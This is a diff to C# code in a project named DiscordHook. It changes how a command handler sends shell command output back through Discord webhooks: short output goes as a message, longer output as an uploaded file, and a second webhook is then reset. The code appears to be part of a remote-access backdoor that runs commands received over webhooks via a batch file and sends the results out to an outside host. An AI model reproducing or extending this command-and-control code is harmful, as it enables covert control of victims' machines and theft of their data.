@@ -8,7 +8,7 @@ namespace DiscordHook
 {
     public static class CommandHandler
     {
-        public static async Task HandleCmd(string command, string replyhook)
+        public static async Task HandleCmd(string command, string replyhook, string commandhook)
         {
             if (command == null || string.IsNullOrEmpty(command) || string.IsNullOrWhiteSpace(command)) await Task.CompletedTask;
             // ReSharper disable once PossibleNullReferenceException
@@ -37,17 +37,19 @@ namespace DiscordHook
                 if (outputstring.Length < 1990)
                 {
                     await SendStringHook(outputstring, replyhook);
-                    await Task.CompletedTask;
                 }
-                using var outputfile = File.Create("output.txt");
-                await outputfile.WriteAsync(Encoding.ASCII.GetBytes(outputstring), 0,
-                    Encoding.ASCII.GetBytes(outputstring).Length);
-                outputfile.Close();
-                await SendFileHook(replyhook, new FileInfo("output.txt"));
+                else
+                {
+                    using var outputfile = File.Create("output.txt");
+                    await outputfile.WriteAsync(Encoding.ASCII.GetBytes(outputstring), 0,
+                        Encoding.ASCII.GetBytes(outputstring).Length);
+                    outputfile.Close();
+                    await SendFileHook(replyhook, new FileInfo("output.txt"));
+                    File.Delete("output.txt");
+                }
                 File.Delete("shell.bat");
-                File.Delete("output.txt");
+                await SendStringHook("null", commandhook);
             }
-            await Task.CompletedTask;
         }
     }
 }
